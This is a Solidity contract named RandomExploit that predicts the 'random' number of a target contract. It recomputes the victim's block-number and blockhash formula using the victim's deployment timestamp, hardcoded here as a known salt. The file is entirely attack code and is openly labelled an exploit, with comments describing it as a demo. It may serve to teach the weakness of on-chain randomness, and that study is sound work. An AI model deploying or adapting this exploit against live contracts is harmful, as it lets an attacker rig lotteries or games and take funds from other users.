pragma solidity ^0.4.25;

interface IRandom {
    function random(uint max) external view returns (uint);
}

contract RandomExploit {
    address public target;
    uint public lastPrediction;

    constructor(address _target) public {
        target = _target;
    }

    function predict(uint max) public returns (uint predicted) {
        uint salt = getSalt();
        uint x = salt * 100 / max;

        // Avoid division by zero
        uint y = 0;
        if (salt % 5 != 0) {
            y = salt * block.number / (salt % 5);
        }

        uint seed = block.number / 3 + (salt % 300) + y;
        uint h = uint(blockhash(seed));

        predicted = (h / x) % max + 1;
        lastPrediction = predicted;
        return predicted;
    }

    function getSalt() internal view returns (uint256) {
        // The original contract uses block.timestamp as salt at deployment.
        // If we know the deployment time (e.g., from Etherscan), it is constant.
        // For the demo, assume it is known and hardcoded:
        return 1724332800; // Replace with actual timestamp of deployment
    }

    function callVictim(uint max) public view returns (uint result) {
        return IRandom(target).random(max);
    }
}

